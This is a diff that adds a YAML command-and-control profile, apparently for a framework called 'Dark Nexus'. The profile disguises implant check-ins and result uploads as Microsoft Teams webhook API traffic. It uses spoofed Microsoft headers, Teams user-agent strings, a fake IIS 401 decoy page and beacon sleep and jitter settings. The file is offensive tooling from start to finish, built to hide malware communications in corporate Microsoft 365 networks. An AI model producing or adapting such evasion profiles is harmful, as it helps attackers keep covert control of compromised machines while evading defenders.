@@ -1,0 +1,52 @@
+# Dark Nexus C2 Profile: Microsoft Teams Webhook
+# Mimics Microsoft Teams notification/webhook traffic
+# Effective in corporate M365 environments where Teams traffic is ubiquitous
+
+name: "teams-webhook"
+description: "Traffic shaped as Microsoft Teams webhook API calls"
+
+http:
+  checkin:
+    uri: "/api/v2/teams/notifications/webhook"
+    method: "POST"
+    headers:
+      Content-Type: "application/json; charset=utf-8"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9"
+      X-MS-Client-Request-Id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+      X-Correlation-ID: "f47ac10b-58cc-4372-a567-0e02b2c3d479"
+      Client-Request-Id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+
+  result:
+    uri: "/api/v2/teams/notifications/webhook/results"
+    method: "POST"
+    headers:
+      Content-Type: "application/json; charset=utf-8"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9"
+      X-MS-Client-Request-Id: "b2c3d4e5-f6a7-8901-bcde-f12345678901"
+
+  default_page:
+    status: 401
+    headers:
+      Server: "Microsoft-IIS/10.0"
+      WWW-Authenticate: "Bearer realm=\"\", authorization_uri=\"https://login.microsoftonline.com/common/oauth2/authorize\""
+      Content-Type: "application/json; charset=utf-8"
+      X-Content-Type-Options: "nosniff"
+    body: |
+      {"error":{"code":"InvalidAuthenticationToken","message":"Access token has expired or is not yet valid.","innerError":{"date":"2024-01-15T12:00:00","request-id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890"}}}
+
+user_agents:
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.7.00.3653 Chrome/120.0.6099.291 Electron/28.2.5 Safari/537.36"
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/24004.1307.2669.7070 Chrome/120.0.6099.291 Electron/28.2.5 Safari/537.36"
+  - "SkypeSpaces/1.0a$*+; Teams/1.7.00.3653"
+
+beacon:
+  sleep: 15
+  jitter: 25
+  max_retries: 8
+  kill_date: ""
+
+tls:
+  cert: ""
+  key: ""
